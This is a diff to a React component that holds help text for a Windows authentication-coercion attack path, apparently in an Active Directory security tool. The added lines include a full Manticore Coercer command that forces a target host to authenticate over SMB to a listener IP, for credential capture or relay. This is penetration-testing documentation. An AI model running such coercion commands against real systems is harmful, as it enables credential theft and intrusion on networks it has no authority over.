@@ -48,22 +48,20 @@ const WindowsAbuse: FC<EdgeInfoProps> = () => {
                     href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
                     Windows Coerced Authentication Methods
                 </Link>
-                . Examples of tools include:
-                <ul style={{ paddingLeft: '1.5em' }}>
-                    <li>
-                        <Link
-                            target='_blank'
-                            rel='noopener noreferrer'
-                            href='https://github.com/leechristensen/SpoolSample'>
-                            SpoolSample
-                        </Link>
-                    </li>
-                    <li>
-                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/topotam/PetitPotam'>
-                            PetitPotam
-                        </Link>
-                    </li>
-                </ul>
+                .
+            </Typography>
+            <Typography variant='body2'>
+                Every coercion technique has prerequisites that must be met on the target. The following command uses{' '}
+                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/TheManticoreProject/coercer'>
+                    Manticore Coercer
+                </Link>{' '}
+                to attempt all relevant SMB coercion techniques. Success depends on the prerequisites for at least one
+                technique being met.
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'manticore-coercer coerce -t <target> -u <user> -p <pass> -d <domain> -l <listener-ip> --always-continue --path-type smb'
+                }
             </Typography>
         </>
     );
